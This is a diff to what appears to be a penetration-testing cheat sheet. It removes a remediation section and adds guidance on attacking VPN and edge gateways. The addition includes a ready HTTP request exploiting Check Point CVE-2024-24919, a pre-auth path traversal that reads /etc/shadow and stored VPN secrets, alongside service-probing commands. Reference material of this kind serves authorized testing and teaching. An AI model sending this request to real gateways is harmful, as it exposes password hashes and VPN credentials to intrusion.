@@ -242,11 +242,27 @@ memcstat --servers=$IP ; nc $IP 11211 <<< $'stats items\r'
 curl -s http://$IP:9200/_cat/indices?v      # -> ../webtech/kibana-elk.md
 ```
 
-## :material-shield-check: Remediation (for the report)
+## :material-vpn: VPN / edge gateways — HTTPS 443
 
-- Close/​firewall unused services; never expose SMB/RDP/DB ports to untrusted nets.
-- Kill anonymous access (FTP, SMB null, LDAP anon bind, unauth Redis).
-- Patch to current versions; enforce strong auth (keys, NLA, no default creds).
+Internet-facing SSL-VPN and firewall management portals are prime targets — a single
+appliance CVE often yields pre-auth file read or RCE. Fingerprint the vendor login
+page, then match it to a known appliance bug.
+
+!!! bug "Check Point Security Gateway — CVE-2024-24919"
+    Remote Access VPN / Mobile Access blades: a pre-auth path traversal in
+    `/clients/MyCRL` reads arbitrary files (including `/etc/shadow` and stored
+    password hashes / VPN secrets).
+
+    ```http
+    POST /clients/MyCRL HTTP/1.1
+    Host: $TARGET
+    Content-Length: 39
+
+    aCSHELL/../../../../../../../etc/shadow
+    ```
+
+    A file's contents in the response confirms it. Ref:
+    [watchTowr write-up](https://labs.watchtowr.com/check-point-wrong-check-point-cve-2024-24919/).
 
 ## :material-link-variant: Related
 
